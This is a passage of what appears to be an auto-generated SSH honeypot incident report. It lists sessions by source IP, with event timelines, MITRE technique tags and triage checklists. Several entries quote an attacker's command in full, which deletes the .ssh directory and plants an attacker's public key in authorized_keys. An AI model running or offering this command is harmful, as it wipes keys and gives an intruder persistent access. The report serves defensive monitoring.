| `2026-06-12 14:00:11` | `cowrie.session.connect` |
| `2026-06-12 14:00:11` | `cowrie.client.version` |
| `2026-06-12 14:00:12` | `cowrie.client.kex` |
| `2026-06-12 14:00:12` | `cowrie.login.success` |
| `2026-06-12 14:00:12` | `cowrie.session.params` |
| `2026-06-12 14:00:12` | `cowrie.command.input` |
| `2026-06-12 14:00:12` | `cowrie.command.failed` |
| `2026-06-12 14:00:12` | `cowrie.log.closed` |
| `2026-06-12 14:00:12` | `cowrie.session.params` |
| `2026-06-12 14:00:12` | `cowrie.command.input` |
| `2026-06-12 14:00:12` | `cowrie.session.file_download` |
| `2026-06-12 14:00:12` | `cowrie.log.closed` |
| `2026-06-12 14:00:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.82.120[.]244` to AbuseIPDB if not already reported
- [ ] Block `183.82.120[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-deaa668cc64c

| Field | Detail |
|---|---|
| **Source IP** | `183.82.120[.]244` |
| **First Seen** | 2026-06-12 14:00 |
| **Last Seen** | 2026-06-12 14:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 14:00:13` | `cowrie.session.connect` |
| `2026-06-12 14:00:13` | `cowrie.client.version` |
| `2026-06-12 14:00:13` | `cowrie.client.kex` |
| `2026-06-12 14:00:13` | `cowrie.login.success` |
| `2026-06-12 14:00:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.82.120[.]244` to AbuseIPDB if not already reported
- [ ] Block `183.82.120[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-314b617d5c09

| Field | Detail |
|---|---|
| **Source IP** | `171.237.176[.]209` |
| **First Seen** | 2026-06-12 14:01 |
| **Last Seen** | 2026-06-12 14:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 14:01:44` | `cowrie.session.connect` |
| `2026-06-12 14:01:44` | `cowrie.client.version` |
| `2026-06-12 14:01:44` | `cowrie.client.kex` |
| `2026-06-12 14:01:44` | `cowrie.login.success` |
| `2026-06-12 14:01:45` | `cowrie.session.params` |
| `2026-06-12 14:01:45` | `cowrie.command.input` |
| `2026-06-12 14:01:45` | `cowrie.command.failed` |
| `2026-06-12 14:01:45` | `cowrie.log.closed` |
| `2026-06-12 14:01:45` | `cowrie.session.params` |
| `2026-06-12 14:01:45` | `cowrie.command.input` |
| `2026-06-12 14:01:46` | `cowrie.session.file_download` |
| `2026-06-12 14:01:46` | `cowrie.log.closed` |
| `2026-06-12 14:01:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.237.176[.]209` to AbuseIPDB if not already reported
- [ ] Block `171.237.176[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51b596239577

| Field | Detail |
|---|---|
| **Source IP** | `171.237.176[.]209` |
| **First Seen** | 2026-06-12 14:01 |
| **Last Seen** | 2026-06-12 14:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 14:01:48` | `cowrie.session.connect` |
| `2026-06-12 14:01:48` | `cowrie.client.version` |
| `2026-06-12 14:01:48` | `cowrie.client.kex` |
| `2026-06-12 14:01:49` | `cowrie.login.success` |
| `2026-06-12 14:01:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.237.176[.]209` to AbuseIPDB if not already reported
- [ ] Block `171.237.176[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5802582fa0f2

| Field | Detail |
|---|---|
| **Source IP** | `179.184.160[.]50` |
| **First Seen** | 2026-06-12 14:02 |
| **Last Seen** | 2026-06-12 14:02 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 14:02:21` | `cowrie.session.connect` |
| `2026-06-12 14:02:21` | `cowrie.client.version` |
| `2026-06-12 14:02:21` | `cowrie.client.kex` |
| `2026-06-12 14:02:23` | `cowrie.login.success` |
| `2026-06-12 14:02:24` | `cowrie.session.params` |
| `2026-06-12 14:02:24` | `cowrie.command.input` |
| `2026-06-12 14:02:24` | `cowrie.command.failed` |
| `2026-06-12 14:02:24` | `cowrie.log.closed` |
| `2026-06-12 14:02:25` | `cowrie.session.params` |
| `2026-06-12 14:02:25` | `cowrie.command.input` |
| `2026-06-12 14:02:25` | `cowrie.session.file_download` |
| `2026-06-12 14:02:25` | `cowrie.log.closed` |
| `2026-06-12 14:02:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.184.160[.]50` to AbuseIPDB if not already reported
- [ ] Block `179.184.160[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e85f810713b0

| Field | Detail |
|---|---|
| **Source IP** | `98.26.115[.]52` |
| **First Seen** | 2026-06-12 14:02 |
| **Last Seen** | 2026-06-12 14:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 14:02:25` | `cowrie.session.connect` |
| `2026-06-12 14:02:25` | `cowrie.client.version` |
| `2026-06-12 14:02:26` | `cowrie.client.kex` |
| `2026-06-12 14:02:27` | `cowrie.login.success` |
| `2026-06-12 14:02:27` | `cowrie.session.params` |
| `2026-06-12 14:02:27` | `cowrie.command.input` |
| `2026-06-12 14:02:27` | `cowrie.command.failed` |
| `2026-06-12 14:02:27` | `cowrie.log.closed` |
| `2026-06-12 14:02:28` | `cowrie.session.params` |
| `2026-06-12 14:02:28` | `cowrie.command.input` |
| `2026-06-12 14:02:28` | `cowrie.session.file_download` |
| `2026-06-12 14:02:28` | `cowrie.log.closed` |
| `2026-06-12 14:02:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.26.115[.]52` to AbuseIPDB if not already reported
- [ ] Block `98.26.115[.]52` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3c102f6a9ee

| Field | Detail |
|---|---|
| **Source IP** | `179.184.160[.]50` |
| **First Seen** | 2026-06-12 14:02 |
| **Last Seen** | 2026-06-12 14:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 14:02:29` | `cowrie.session.connect` |
| `2026-06-12 14:02:29` | `cowrie.client.version` |
| `2026-06-12 14:02:29` | `cowrie.client.kex` |
| `2026-06-12 14:02:30` | `cowrie.login.success` |
| `2026-06-12 14:02:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.184.160[.]50` to AbuseIPDB if not already reported
- [ ] Block `179.184.160[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-441f3ee58a34

| Field | Detail |
|---|---|
| **Source IP** | `98.26.115[.]52` |
| **First Seen** | 2026-06-12 14:02 |
| **Last Seen** | 2026-06-12 14:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 14:02:31` | `cowrie.session.connect` |
| `2026-06-12 14:02:31` | `cowrie.client.version` |
| `2026-06-12 14:02:31` | `cowrie.client.kex` |
| `2026-06-12 14:02:33` | `cowrie.login.success` |
| `2026-06-12 14:02:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.26.115[.]52` to AbuseIPDB if not already reported
- [ ] Block `98.26.115[.]52` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb69076a456f

| Field | Detail |
|---|---|
| **Source IP** | `179.184.160[.]50` |
| **First Seen** | 2026-06-12 14:06 |
| **Last Seen** | 2026-06-12 14:06 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 14:06:25` | `cowrie.session.connect` |
| `2026-06-12 14:06:25` | `cowrie.client.version` |
| `2026-06-12 14:06:25` | `cowrie.client.kex` |
| `2026-06-12 14:06:26` | `cowrie.login.success` |
| `2026-06-12 14:06:27` | `cowrie.session.params` |
| `2026-06-12 14:06:27` | `cowrie.command.input` |
| `2026-06-12 14:06:27` | `cowrie.command.failed` |
| `2026-06-12 14:06:27` | `cowrie.log.closed` |
| `2026-06-12 14:06:28` | `cowrie.session.params` |
| `2026-06-12 14:06:28` | `cowrie.command.input` |
| `2026-06-12 14:06:29` | `cowrie.session.file_download` |
| `2026-06-12 14:06:29` | `cowrie.log.closed` |
| `2026-06-12 14:06:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.184.160[.]50` to AbuseIPDB if not already reported
- [ ] Block `179.184.160[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfc9380c20ab

| Field | Detail |
|---|---|
| **Source IP** | `179.184.160[.]50` |
| **First Seen** | 2026-06-12 14:06 |
| **Last Seen** | 2026-06-12 14:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 14:06:32` | `cowrie.session.connect` |
| `2026-06-12 14:06:32` | `cowrie.client.version` |
| `2026-06-12 14:06:32` | `cowrie.client.kex` |
| `2026-06-12 14:06:34` | `cowrie.login.success` |
| `2026-06-12 14:06:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.184.160[.]50` to AbuseIPDB if not already reported
- [ ] Block `179.184.160[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50193b03331f

| Field | Detail |
|---|---|
| **Source IP** | `89.117.50[.]180` |
| **First Seen** | 2026-06-12 14:10 |
| **Last Seen** | 2026-06-12 14:10 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 14:10:31` | `cowrie.session.connect` |
| `2026-06-12 14:10:31` | `cowrie.client.version` |
| `2026-06-12 14:10:32` | `cowrie.client.kex` |
| `2026-06-12 14:10:32` | `cowrie.login.success` |
| `2026-06-12 14:10:33` | `cowrie.session.params` |
| `2026-06-12 14:10:33` | `cowrie.command.input` |
| `2026-06-12 14:10:33` | `cowrie.command.failed` |
| `2026-06-12 14:10:33` | `cowrie.log.closed` |
| `2026-06-12 14:10:33` | `cowrie.session.params` |
| `2026-06-12 14:10:33` | `cowrie.command.input` |
| `2026-06-12 14:10:33` | `cowrie.session.file_download` |
| `2026-06-12 14:10:33` | `cowrie.log.closed` |
| `2026-06-12 14:10:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.117.50[.]180` to AbuseIPDB if not already reported
- [ ] Block `89.117.50[.]180` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-087b5bd316dd

| Field | Detail |
|---|---|
| **Source IP** | `89.117.50[.]180` |
| **First Seen** | 2026-06-12 14:10 |
| **Last Seen** | 2026-06-12 14:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 14:10:35` | `cowrie.session.connect` |
| `2026-06-12 14:10:35` | `cowrie.client.version` |
| `2026-06-12 14:10:36` | `cowrie.client.kex` |
| `2026-06-12 14:10:36` | `cowrie.login.success` |
| `2026-06-12 14:10:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.117.50[.]180` to AbuseIPDB if not already reported
- [ ] Block `89.117.50[.]180` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fa1bf52abd9

| Field | Detail |
|---|---|
| **Source IP** | `183.82.120[.]244` |
| **First Seen** | 2026-06-12 14:11 |
| **Last Seen** | 2026-06-12 14:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 14:11:22` | `cowrie.session.connect` |
| `2026-06-12 14:11:22` | `cowrie.client.version` |
| `2026-06-12 14:11:22` | `cowrie.client.kex` |
| `2026-06-12 14:11:22` | `cowrie.login.success` |
| `2026-06-12 14:11:22` | `cowrie.session.params` |
| `2026-06-12 14:11:22` | `cowrie.command.input` |
| `2026-06-12 14:11:22` | `cowrie.command.failed` |
| `2026-06-12 14:11:22` | `cowrie.log.closed` |
| `2026-06-12 14:11:22` | `cowrie.session.params` |
| `2026-06-12 14:11:22` | `cowrie.command.input` |
| `2026-06-12 14:11:22` | `cowrie.session.file_download` |
| `2026-06-12 14:11:22` | `cowrie.log.closed` |
| `2026-06-12 14:11:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.82.120[.]244` to AbuseIPDB if not already reported
- [ ] Block `183.82.120[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-707872efd8bb

| Field | Detail |
|---|---|
| **Source IP** | `183.82.120[.]244` |
| **First Seen** | 2026-06-12 14:11 |
| **Last Seen** | 2026-06-12 14:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 14:11:23` | `cowrie.session.connect` |
| `2026-06-12 14:11:23` | `cowrie.client.version` |
| `2026-06-12 14:11:23` | `cowrie.client.kex` |
| `2026-06-12 14:11:24` | `cowrie.login.success` |
| `2026-06-12 14:11:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.82.120[.]244` to AbuseIPDB if not already reported
- [ ] Block `183.82.120[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fa2db769c8d

| Field | Detail |
|---|---|
| **Source IP** | `98.26.115[.]52` |
| **First Seen** | 2026-06-12 14:12 |
| **Last Seen** | 2026-06-12 14:12 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 14:12:10` | `cowrie.session.connect` |
| `2026-06-12 14:12:10` | `cowrie.client.version` |
| `2026-06-12 14:12:10` | `cowrie.client.kex` |
| `2026-06-12 14:12:11` | `cowrie.login.success` |
| `2026-06-12 14:12:12` | `cowrie.session.params` |
| `2026-06-12 14:12:12` | `cowrie.command.input` |
| `2026-06-12 14:12:12` | `cowrie.command.failed` |
| `2026-06-12 14:12:12` | `cowrie.log.closed` |
| `2026-06-12 14:12:13` | `cowrie.session.params` |
| `2026-06-12 14:12:13` | `cowrie.command.input` |
| `2026-06-12 14:12:13` | `cowrie.session.file_download` |
| `2026-06-12 14:12:13` | `cowrie.log.closed` |
| `2026-06-12 14:12:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.26.115[.]52` to AbuseIPDB if not already reported
- [ ] Block `98.26.115[.]52` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfd2844e5633

| Field | Detail |
|---|---|
| **Source IP** | `98.26.115[.]52` |
| **First Seen** | 2026-06-12 14:12 |
| **Last Seen** | 2026-06-12 14:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 14:12:16` | `cowrie.session.connect` |
| `2026-06-12 14:12:16` | `cowrie.client.version` |
| `2026-06-12 14:12:16` | `cowrie.client.kex` |
| `2026-06-12 14:12:17` | `cowrie.login.success` |
| `2026-06-12 14:12:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.26.115[.]52` to AbuseIPDB if not already reported
- [ ] Block `98.26.115[.]52` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-207ecfc7d8ab

| Field | Detail |
|---|---|
| **Source IP** | `185.99.99[.]95` |
| **First Seen** | 2026-06-12 14:13 |
| **Last Seen** | 2026-06-12 14:13 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 14:13:32` | `cowrie.session.connect` |
| `2026-06-12 14:13:32` | `cowrie.client.version` |
| `2026-06-12 14:13:32` | `cowrie.client.kex` |
| `2026-06-12 14:13:32` | `cowrie.login.success` |
| `2026-06-12 14:13:33` | `cowrie.session.params` |
| `2026-06-12 14:13:33` | `cowrie.command.input` |
| `2026-06-12 14:13:33` | `cowrie.command.failed` |
| `2026-06-12 14:13:33` | `cowrie.log.closed` |
| `2026-06-12 14:13:33` | `cowrie.session.params` |
| `2026-06-12 14:13:33` | `cowrie.command.input` |
| `2026-06-12 14:13:34` | `cowrie.session.file_download` |
| `2026-06-12 14:13:34` | `cowrie.log.closed` |
| `2026-06-12 14:13:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.99.99[.]95` to AbuseIPDB if not already reported
- [ ] Block `185.99.99[.]95` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-894e022f5212

| Field | Detail |
|---|---|
| **Source IP** | `185.99.99[.]95` |
| **First Seen** | 2026-06-12 14:13 |
| **Last Seen** | 2026-06-12 14:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 14:13:36` | `cowrie.session.connect` |
| `2026-06-12 14:13:36` | `cowrie.client.version` |
| `2026-06-12 14:13:36` | `cowrie.client.kex` |
